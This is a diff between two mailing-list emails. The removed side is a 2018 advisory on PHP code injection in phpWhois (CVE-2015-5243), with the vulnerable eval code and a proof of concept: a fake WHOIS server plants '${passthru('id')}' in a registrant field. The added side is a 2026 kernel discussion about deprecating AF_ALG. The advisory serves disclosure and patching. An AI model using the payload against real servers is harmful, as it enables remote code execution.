@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["11968" "Wednesday" "1" "August" "2018" "19:57:22" "+0200" "SBA Research Advisory" "advisory@sba-research.org" "<e63b4c67-4a64-6301-37b8-3660f45370b6@sba-research.org>" "287" "[oss-security] [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before 5.1.0 PHP Code Injection" nil nil nil "8" "2018080117:57:22" "[oss-security] [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before 5.1.0 PHP Code Injection" (number mark "U       advisory@sba Aug  1  287/11968 " thread-indent "\"[oss-security] [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before 5.1.0 PHP Code Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 11875 invoked by uid 550); 1 Aug 2018 18:09:28 -0000
+Received: (qmail 1229 invoked by uid 550); 1 May 2026 20:46:47 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,349 +7,203 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 4082 invoked from network); 1 Aug 2018 17:57:48 -0000
-From: SBA Research Advisory <advisory@sba-research.org>
-To: <oss-security@lists.openwall.com>
-Openpgp: preference=signencrypt
-Autocrypt: addr=advisory@sba-research.org; keydata=
- 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
- 5WT/0Mk3JDbE
-Message-ID: <e63b4c67-4a64-6301-37b8-3660f45370b6@sba-research.org>
-Date: Wed, 1 Aug 2018 19:57:22 +0200
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101
- Thunderbird/52.9.1
+x-ms-reactions: disallow
+Received: (qmail 9364 invoked from network); 1 May 2026 20:18:53 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
+	s=k20201202; t=1777666724;
+	bh=z5dLF6RTaqC0Y/bL9qv8btlXUpTn6qLIrA8inUG+wAQ=;
+	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
+	b=jghcKBALTHHKThRK7ud0oZVrSzREda7M/Cw15kOwqORaUJ2tKr6RbnB1bh/YtrQGR
+	 Ru3FAziuxeAshC+jhHKyvoPVe+oJZDx0K3UHliykiVp5266nNX5qgcDIyWUH/qpK2L
+	 WdPzGqklG1c9jA07tUr9I+Ch103Id3b0dcNWOMJ4J5mLBAgEbs7elIvXX/ijGJ44a/
+	 YhiDU+3yyk2mYfHbcrkZXFDHIq1re/aoa2ZJNMZp2FtbL5uTqdP+nJJnTxJL7dwo3I
+	 Z7qrUQdH4zcyckb3FELKh0uKd9Tt9khe5VhAeeGCRi8Am5AUDbXHDp8Aofz1Grn2U5
+	 u1H43fsoD09Qg==
+Date: Fri, 1 May 2026 13:18:41 -0700
+From: Eric Biggers <ebiggers@kernel.org>
+To: Demi Marie Obenour <demiobenour@gmail.com>
+Cc: oss-security@lists.openwall.com,
+	Jan Schaumann <jschauma@netmeister.org>, iwd@lists.linux.dev
+Message-ID: <20260501201841.GA2540@quark>
+References: <afJorKIje4O6dXbH@netmeister.org>
+ <d6111caa-db61-498a-92cb-ea7a0aa0a5e2@ehuk.net>
+ <87se8dgicq.fsf@gentoo.org>
+ <afL-QhLfEKqHZqka@eldamar.lan>
+ <20260430071917.GB54208@sol>
+ <177abb5d-8ba9-4bb9-8b23-9fbc868ed3cd@gmail.com>
+ <20260501180028.GA2260@sol>
+ <19837ef5-e5b6-45f4-8336-3ce07423dfb1@gmail.com>
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
-	protocol="application/pgp-signature";
-	boundary="gy4FoDM3yqwpS6htq5UnslzcyziEioeEY"
-X-Originating-IP: [192.168.20.42]
-Subject: [oss-security] [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before
- 5.1.0 PHP Code Injection
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <19837ef5-e5b6-45f4-8336-3ce07423dfb1@gmail.com>
+Subject: Re: [oss-security] CVE-2026-31431: CopyFail: linux local privilege
+ scalation
 
---gy4FoDM3yqwpS6htq5UnslzcyziEioeEY
-Content-Type: multipart/mixed; boundary="aTtKoGnYkaaqoslNqdxH4q3F8At1YvwZl";
- protected-headers="v1"
-From: SBA Research Advisory <advisory@sba-research.org>
-To: oss-security@lists.openwall.com
-Message-ID: <e63b4c67-4a64-6301-37b8-3660f45370b6@sba-research.org>
-Subject: [SBA-ADV-20180425-01] CVE-2015-5243 rediscovered: phpWhois before
- 5.1.0 PHP Code Injection
+On Fri, May 01, 2026 at 03:24:51PM -0400, Demi Marie Obenour wrote:
+> On 5/1/26 14:00, Eric Biggers wrote:
+> > On Fri, May 01, 2026 at 11:30:17AM -0400, Demi Marie Obenour wrote:
+> >>> But I also hope this finally provides some more impetus for AF_ALG to be
+> >>> deprecated and removed.  It's a massive, largely pointless attack
+> >>> surface which has been causing problems, including regular CVEs, ever
+> >>> since it was added to the kernel in 2010.  And of course it's gotten
+> >>> even worse lately, with LLMs now being able to find the bugs.
+> >>>
+> >>> Userspace crypto libraries exist.  There's no need to escalate to kernel
+> >>> mode just to do some math.
+> >>
+> >> The only reason I can think of to keep it is for embedded systems
+> >> with weak CPUs and crypto accelerators that are actually worth using.
+> >> However, those seem to be very rare outside of things like routers,
+> >> which run specialized distros like OpenWRT.  Even when the accelerator
+> >> exists and is worth using, AF_ALG is certainly not an efficient way
+> >> to access it.
+> >>
+> >> Furthermore, an inline encryption engine in the NIC would be a much
+> >> better choice for future router designs.  AF_ALG doesn't work with
+> >> that at all.
+> > 
+> > All correct, of course.
+> > 
+> > The main other claimed benefit of AF_ALG (and the similar KEYCTL_PKEY_*)
+> > that sometimes gets mentioned is, ironically, a security one: keys can
+> > be kept out of a particular userspace processes's address space.
+> > 
+> > But:
+> > 
+> > - Different userspace processes have different address spaces too.  So
+> >   it already can be, and indeed often already is, done in userspace.
+> > 
+> > - This security benefit is kind of besides the point when the interface
+> >   has a privilege escalation bug every few months.
+> > 
+> > - The kernel often doesn't support the algorithm needed, or if it does,
+> >   some of them just aren't as well maintained as userspace libraries
+> >   like OpenSSL and BoringSSL.  For example, the kernel's RSA
+> >   signing/decryption code is vulnerable to timing side-channels.
+> > 
+> > (I'd like to specifically call out
+> > https://blog.cloudflare.com/the-linux-kernel-key-retention-service-and-why-you-should-use-it-in-your-next-application/
+> > as being misleading and harmful.  It says to use the kernel for RSA
+> > private key operations.  But it fails to mention the kernel's RSA
+> > implementation being vulnerable to timing side-channels or the steady
+> > stream of vulnerabilities in the associated UAPIs.)
+> > 
+> >>> On Linux systems with no programs that use AF_ALG, it can already be
+> >>> disabled in the kconfig by unsetting CONFIG_CRYPTO_USER_API_*.
+> >>>
+> >>> But there are some holdouts like iwd (iNet wireless daemon) that are
+> >>> keeping general-purpose Linux distros from being able to disable it.
+> >>
+> >> If AF_ALG was removed from the kernel, that would provide an incentive
+> >> for someone to patch iwd to use a userspace library instead.  Or if
+> >> iwd is unmaintained, it (sadly) needs to be removed from distros.
+> >> (Sadly because wpa-supplicant is much less well designed.)
+> > 
+> > Where iwd is used, AF_ALG can't just be removed from the kernel
+> > unilaterally.  People would complain that iwd is broken and invoke the
+> > "no regressions" rule.  While only a few programs use it (iwd, bluez,
+> > cryptsetup with certain options), they are enough for this to happen.
+> > 
+> > We do remove algorithms from AF_ALG occasionally, but we've been unable
+> > to remove ones like MD4 (yes, that MD4) that are still used by iwd:
+> > https://lore.kernel.org/linux-crypto/946591db-36aa-23db-a5c4-808546eab762@gmail.com/
+> > Likewise with removing support for SHA-1 from KEYCTL_PKEY_*
+> > (https://lore.kernel.org/linux-crypto/f0492c92-1015-48e3-bfce-598c7a4843d1@quicinc.com/).
+> > People even post the Linus quote "we simply do not break user space".
+> > 
+> > Unfortunately, the developers and users of this small set of userspace
+> > programs are disconnected from the extraordinary amount of time and
+> > effort that the rest of the Linux community is putting in to maintain
+> > these UAPIs and respond to the continuous stream of vulnerabilities.
+> > 
+> > To them these are simply APIs available that work.
+> > 
+> > This is actually one of the reasons I've been making these public posts:
+> > this needs to be a community effort to deprecate these UAPIs.
+> > 
+> > If the developers of these userspace programs aren't taking action yet,
+> > people need to volunteer to go in and fix these programs.  Again, it's
+> > actually a pretty small set of programs that even uses this stuff.
+> > 
+> > This would be really impactful to the security of Linux.
+> > 
+> > A lot of the discourse around this vulnerability has focused on the
+> > things that went wrong with the patching.  It did go very badly, but I
+> > feel it's also missing the point a bit.  AF_ALG and KEYCTL_PKEY_*
+> > actually have a continuous stream of vulnerabilities, which has only
+> > accelerated in the era of LLMs.  Just in the last year there have been
+> > at least 4 privilege escalations in AF_ALG, I think.  We need to fix the
+> > root cause of why this is happening.
+> > 
+> > And I think it really can be fixed.  It's just a few programs that are
+> > using these UAPIs.  Many systems already don't need them at all.
+> > 
+> > But people need to help.  Send patches to iwd, bluez, cryptsetup, etc.
+> > that make them use userspace crypto libraries instead of AF_ALG and
+> > KEYCTL_PKEY_*.  If the maintainers aren't convinced yet, then patch
+> > downstream in your distro as a starting point (and disable the UAPIs in
+> > your kernel).  Or help in other ways like writing blog posts that
+> > promote attack surface reduction and the alternatives to these UAPIs.
+> > 
+> > I'd also like to explore some more incremental approaches, such as
+> > making these UAPIs require CAP_SYS_ADMIN, possibly configurable by a
+> > sysctl.  If anyone knows of anything important that would be broken by a
+> > CAP_SYS_ADMIN requirement on AF_ALG and KEYCTL_PKEY_*, let me know.
+> 
+> Cryptsetup needs CAP_SYS_ADMIN, but iwd definitely does not, and
+> presumably BlueZ should not use have it either.
+> 
+> Cryptsetup is a special case because there are times when it may not
+> be safe to allocate memory: if I/O to the swap partition is suspended,
+> and the kernel tries to page data out to it, the system may deadlock.
+> So calling into arbitrary third-party libraries might not be the best
+> idea.  Thankfully, Nettle should meet all of cryptsetup's requirements.
 
---aTtKoGnYkaaqoslNqdxH4q3F8At1YvwZl
-Content-Type: multipart/mixed;
- boundary="------------229FCECFECEEB653681F469B"
-Content-Language: en-US
+Cryptsetup only uses AF_ALG for certain operations like keyslot
+encryption, and only in certain cases: Cryptsetup's default settings
+work fine with all CONFIG_CRYPTO_USER_API_* options disabled in the
+kernel.  The actual I/O to/from encrypted partitions is handled by
+dm-crypt in the kernel and has nothing to do with AF_ALG.
 
-This is a multi-part message in MIME format.
---------------229FCECFECEEB653681F469B
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+Cryptsetup even already supports userspace crypto libraries as well.  It
+seems there are just some gaps in how it's using them.  For example for
+AES-GCM it seems to just go directly to AF_ALG, despite the cryptsetup
+binary already being linked to OpenSSL, which means a complete userspace
+implementation of AES-GCM is already present in its address space!
 
-# phpWhois PHP Code Injection #
+> > I think there should also be an allowlist of algorithms, and the splice
+> > support should be removed.  (Interestingly, there's precedent for
+> > removing splice support from AF_ALG: it was already removed from the 6.1
+> > LTS kernel last year, seemingly accidentally.  That's why the copy.fail
+> > exploit didn't work on 6.1 but did work on other versions.)
+> > 
+> > - Eric
+> 
+> Would an allowlist and removing splice support allow migrating to
+> the crypto library code?  I looked at the list of CVEs you provided,
+> and I think it would prevent most of the recent ones.  The crypto
+> library is (as you pointed out) so much easier to use.
 
-Link: https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20=
-180425-01_phpWhois_Code_Execution
+I'm hoping that at least some of these ideas for attack surface
+reduction (requiring CAP_SYS_ADMIN, allowlisting the algorithms,
+removing splice support) can be implemented in parallel without waiting
+for every userspace program to stop using these UAPIs.  Full removal
+needs to be the goal, though.
 
-## Vulnerability Overview ##
+> Also CCing the iwd mailing list.  iwd uses the kernel crypto APIs
+> wherever possible, which is a serious problem.  However, it already
+> needs to perform cryptography in userspace because of ECC.
+> 
+> Nettle provides trivial no-allocation cryptographic APIs.  Nettle's
+> licensing (LGPLv3+ or GPLv2+) might prevent this, though.  OpenSSL has
+> a horrible API, but AWS-LC has a much better one.  It also implements
+> TLS, which would might allow iwd to get rid of its built-in TLS code
+> for EAP-TLS.
 
-phpWhois and some of its forks in versions before 5.1.0 are prone to a
-code injection vulnerability due to insufficient sanitization of returned
-WHOIS data. This allows attackers controlling the WHOIS information of a
-requested domain to execute arbitrary PHP code in the context of the
-application.
+It's unfortunate that the situation with userspace crypto libraries is
+fragmented, with the de facto standard one (OpenSSL) not being all that
+great.  But that's no excuse to say "put it all in the kernel".  Even
+using OpenSSL would still be much better.
 
-* **Identifier**            : SBA-ADV-20180425-01
-* **Type of Vulnerability** : Code Injection
-* **Software/Product Name** : phpWhois
-* **Vendor**                : [phpwhois.org](http://www.phpwhois.org/),
-                              [abcdmitry](https://github.com/phpWhois/phpWh=
-ois),
-                              [jsmitty12](https://github.com/jsmitty12/phpW=
-hois),
-                              [webalternative](https://github.com/webaltern=
-ative/phpWhois)
-                              and others
-* **Affected Versions**     : phpwhois.org: 4.2.2 and probably prior,
-                              as well as the following forks
-                              abcdmitry: 4.2.5 and probably prior,
-                              jsmitty12: 5.0.2 and probably prior
-* **Fixed in Version**      : jsmitty12: 5.1.0
-* **CVE ID**                : CVE-2015-5243
-* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-* **CVSSv3 Base Score**     : 9.8 (Critical)
-
-## Vendor Description ##
-
-> This package contains a Whois (RFC954) library for PHP. It allows a
-> PHP program to create a Whois object, and obtain the output of a
-> whois query with the lookup function.
-
-Source: <https://github.com/phpWhois/phpWhois>
-
-## Impact ##
-
-By exploiting the vulnerability documented in this advisory, an
-attacker controlling the WHOIS information of a domain retrieved via
-phpWhois can execute arbitrary PHP code in the context of the
-application. The set of domains enabling this attack vector is limited
-to certain top-level domains. Sensitive data accessible by the
-application might get exposed through this attack.
-
-The vulnerability is fixed in version 5.1.0 or newer of jsmitty12's fork.
-We recommend upgrading to this version.
-
-## Vulnerability Description ##
-
-phpWhois implements multiple generic parsers for WHOIS data in
-`whois.parser.php`. The parser implemented in function
-`generic_parser_b` is vulnerable to injection of PHP code.
-
-The function `generic_parser_b` builds a PHP statement from WHOIS data
-values by concatenating strings without proper sanitization. It then
-passes the statement to the `eval` function:
-
-```php
-function generic_parser_b($rawdata, $items =3D array(), $dateformat =3D 'md=
-y', $hasreg =3D true, $scanall =3D false) {
-[...]
-    foreach ($rawdata as $val) {
-        if (trim($val) !=3D '') {
-            if (($val[0] =3D=3D '%' || $val[0] =3D=3D '#') && $disok) {
-                $r['disclaimer'][] =3D trim(substr($val, 1));
-                $disok =3D true;
-                continue;
-            }
-            $disok =3D false;
-            reset($items);
-            foreach ($items as $match =3D> $field) {
-                $pos =3D strpos($val, $match);
-                if ($pos !=3D=3D false) {
-                    if ($field !=3D '') {
-                        $var =3D '$r' . getvarname($field);
-                        $itm =3D trim(substr($val, $pos + strlen($match)));
-                        if ($itm !=3D '')
-                            eval($var . '=3D"' . str_replace('"', '\"', $it=
-m) . '";');
-                    }
-                    if (!$scanall)
-                        break;
-                }
-            }
-        }
-[...]
-}
-```
-
-At least the following 33 top-level domain handlers make use of the
-vulnerable parser:
-
-```text
-ae, aero, ag, asia, au, bh, biz, cat, cn, co, co.za, fi, hu, in, info, jp, =
-lu, me, mobi, museum, name, nz, org, pro, ru, sc, se, su, tel, travel, us, =
-ws, xxx
-```
-
-## Proof-of-Concept ##
-
-An attacker can exploit this vulnerability by setting malicious WHOIS
-information such as `Registrant Name: ${passthru('id')}` for an arbitrary
-`.org` domain.
-Instead of a real name, we specify `${passthru('id')}` which PHP will
-interpret as a variable expansion inside double quoted string literals.
-We simulate this situation via a simple WHOIS server implementation:
-
-```py
-import SocketServer
-
-DATA =3D "Registrant Name: ${passthru('id')}\n"
-
-class WhoisHandler(SocketServer.BaseRequestHandler):
-    def handle(self):
-        self.request.recv(1024)
-        print('Request received')
-        self.request.sendall(DATA)
-        print('Payload sent')
-
-if __name__ =3D=3D '__main__':
-    SocketServer.ThreadingTCPServer.allow_reuse_address =3D True
-    server =3D SocketServer.ThreadingTCPServer(('127.0.0.1', 9999), WhoisHa=
-ndler)
-    server.serve_forever()
-```
-
-The following example sets up phpWhois to use the simulated WHOIS
-server and requests information for `example.org`:
-
-```php
-<?php
-require_once(__DIR__ . '/vendor/autoload.php');
-
-$whois =3D new phpWhois\Whois;
-$whois->useServer('org', '127.0.0.1:9999');
-echo $whois->lookup('example.org');
-```
-
-Therefore, the vulnerable phpWhois version executes the injected PHP
-statement `passthru('id')` which will execute the Unix `id` command on the
-server and return its output.
-
-## Timeline ##
-
-* `2018-04-25`: identification of vulnerability
-* `2018-04-26`: initial contact of several phpWhois and fork maintainers
-* `2018-04-26`: disclosed vulnerability to phpwhois.org project maintainer
-* `2018-04-27`: disclosed vulnerability to jsmitty12
-* `2018-04-30`: phpwhois.org project maintainer stated that it is a
-                known issue (CVE-2015-5243) with a fix committed at
-                <https://github.com/sparc/phpWhois.org>
-* `2018-04-30`: fix is not released yet and MITRE lists CVE-2015-5243
-                as assigned but private
-* `2018-05-29`: jsmitty12 released fixed version 5.1.0
-* `2018-08-01`: public disclosure
-
-## References ##
-
-* Original advisory: <https://blog.nettitude.com/uk/cve-2015-5243-phpwhois-=
-remote-code-execution>
-* Fixes:
-  * <https://github.com/sparc/phpWhois.org/commit/5cc572490c9053d46598ec934=
-8a11e36a5a33a46#diff-f150ae17da7341bf6c2eff928684b3a3>
-  * <https://github.com/Gemorroj/phpwhois/commit/91c937e03c876ba1290b6de2a3=
-ad953d2105fdd0>
-  * <https://github.com/jsmitty12/phpWhois/commit/863ccf62824f9998099ed20c2=
-952ec8953ce3d06>
-
-## Credits ##
-
-* Original advisory by Iain Wallace ([Nettitude](https://www.nettitude.com/=
-))
-* Rediscovered by David Gnedt ([SBA Research](https://www.sba-research.org/=
-))
-
---------------229FCECFECEEB653681F469B
-Content-Type: application/pgp-keys;
- name="0xFBB8862F58F775B2.asc"
-Content-Transfer-Encoding: quoted-printable
-Content-Disposition: attachment;
- filename="0xFBB8862F58F775B2.asc"
-
------BEGIN PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-mQINBFYydZgBEADJRw9wo4WeBOtCXODKDpyqVaiSSMmEvwIoyu9ZVcQ5yw5wzczu=0A=
-M7bcLUhAEwEsiWmfJy6XzF1N6gBcOErFzh8vz+HZFlMirsm5oZ3aRt8TaMkuoCCh=0A=
-CxxT637yxAFq/7NPq8swiUwps345SI5LuBn34SphQbZvdoPfkIG+VfvyxHOuMM33=0A=
-S+78QGRFZyNMiNjCWscw/1kWIKf61cfX4uzV/dxzvFyRba6zF2rSD0tVURXTDCys=0A=
-3NQ8NFTrLFJ9044005iktRXXSxjTvHzL5qfjLpKHXHWUwzveBaT/rEyS/YGHLP9B=0A=
-SKm8MMpQMUqI5nqq/LUceJmOfIM1loSz/hxGpP54QLYlaC0sJQBciucXkwm2eFoH=0A=
-6N6zS6aVHK527/tCAQdZ3uR1LzuViCK1SnrOuoHrzds5b1/gPegMUn6EatJ5gpO/=0A=
-I3p+uxXHUEjOCgwnY/l5kpyzTAqvgUY/Zl+oI6FfdVDhEjUsZ/JQpZI70HoG9Gp8=0A=
-UTAqrtIjXkPOEQF3xlvDaDHq7R0H5Fsjg1Icpddz7fWjnlwfJGzK2zKOVGaZfKnS=0A=
-NvRqqljkNpc4DyQUe7WsfONhrxID3opavGrNbg7pp/qpCfhOCqtJPECwgmJHHBaN=0A=
-vwDwet4GMcl7F/4NVk0xg7lDMd+GFuYlN8taJpEiVlASDKoB9dxM9pDNSwARAQAB=0A=
-tCRhZHZpc29yeSA8YWR2aXNvcnlAc2JhLXJlc2VhcmNoLm9yZz6JAj4EEwECACgF=0A=
-AlYydZgCGwMFCQWuJoAGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEPu4hi9Y=0A=
-93WyX3EQAKLVHVHi5qr3QyeMRArYS0ODmqJmSavINWngLgGR0kuLOya9GWIyG43Z=0A=
-N1YwMDdMBd2TM3RxEkHMmmo3o/eYUywcJjqMBFKegktAIb4ynOB7+4b0nKCHLWdj=0A=
-N26/J72NqEr5TDdAocK+tv5jWJIMQ48uMlQAEg23lt91bZugroZxzDDHzUTjNRE5=0A=
-uX9azT0Sc4CsDDmdeQa1THDwdpsIsq4qAYyWXbzu7zRkjWMYgAXBISBqMhvyyH1L=0A=
-i2kLrMISjg82LpUx5960rP0CQpQ70KPWaQd3jjE9/xK2+CHADBwA6SM7CxQ3m6lW=0A=
-SuBYkbKZvaFshwKZAnyq6t+E0FF7JVpMxmA7SGu0W9FSkJ8LY5ctg3l/ZsJYBRQr=0A=
-2w9BK0yMLhauO4msCCXmU2ApnWb38RdnSFcHJToX6dNc8AEqOAPlf1QVKiIqPW9i=0A=
-nSMwNEPrHOT4tGgIuU6+Q+z/DEaktup/xtOXg2cfD0kpA7lPUm30175WcvNvdG2O=0A=
-K15Eh+6zzN+EZXIjKb87ofYjQf7mLoHn9pDdqTvuXqidc0ztV40z//PYD2VATgg9=0A=
-Y1Mb+MjjayA1p/OEhMZKArFGpGA4CYqWz+2URFRUATgpDBcSgHMC37lXT6J+Aos1=0A=
-w2pmQKTB2s49hFX+8bIS2MXSVJdPgwrKdOzLROXf0WF6R7UBWXAouQINBFYydZgB=0A=
-EADhENFUhRHrt2/Jtkpg1yVqbW+UhrNrLOJ7FCVCioeLVZCgF50ZwLnupu0cZfKR=0A=
-HfkdRKEnog7LazoigDvGryDXZh/5EFnhxezBiScHWfDNHNz/3/ESty36ewjYsghJ=0A=
-LZzgX9qa+hW1TIagEMOWHyY8BnA/D+XByHrt7nw1t+vq7QEkUlXv4sCWMPu8dPf4=0A=
-+s3LWpLTx3J+gRyqiAkhhQb90EydBETlLs0rGvZUt1Cia2KglbJqORCJIhYAtIy2=0A=
-2UqPfzZRfaw9CsdlmVeKt15UqK10m6bqbbtdI4p0Z4PlYVHDrW8VyeEij5aph10A=0A=
-Mmc2klppSooXt49fRRge314m5WWbtVyJray/0bZ9JTIHT4NVWtBsY/ItQf5YrTzr=0A=
-WA2fjzle+pQxtPNfMsKLzzs43jjQvKfX0SGVR4YBD+zYbtkViTxs5KRK1OKo4GRF=0A=
-/XaetIwFd23a+1w8HgRClA3H7kKAxOnKHw9VOXYouxAjsBulw68EVxiHqre8j0he=0A=
-9dssrSizB/H+sNSYzzr1yByGpMV2PWRpRcYTi2FFzT9oB0yux2yjZe7mejUBNZsP=0A=
-czQKkUFHXhS3Fm4kNAWO0wLwJw1gnDGeJ1KN5fU2jSw2L+nVL4GlQUbSq0aPPtFG=0A=
-QSWekIfLz5w4TEFqC5CXt8evGYzlOG3MQiGM7bFkvuWNVQARAQABiQIlBBgBAgAP=0A=
-BQJWMnWYAhsMBQkFriaAAAoJEPu4hi9Y93Wy5dwP/0L16IGdlQR8LXKPsNAOlZhw=0A=
-BoKaOJ+xikt/2ESKrNmCxJdIZhdBH17Sv/ucvF2eeybJPyD3v2nkZ/UOIOnWb918=0A=
-9r5vlR/X3IPT5ScNWxxq9eSwUay4gMIeuuHBGln2m8PJRWduwoHVVJTK/nfKiC5v=0A=
-CjDup3PEoLEIzbvfmHPkzBZjpwN+YSCC0CwLel/UbtgDZnPeyXLZgVqldoq7+Ef5=0A=
-ztQaBcdA9DBARrqX04RhZhu8xOQzeeTuvzflkUGa5X5mg4vDKstX1tZi2isRVFyk=0A=
-FdpcXCxWVHNVTHW4+9ILeE+to2PRd1Fjv21E9/9V1zuAF5+eU86dX2pM4eKmXpyJ=0A=
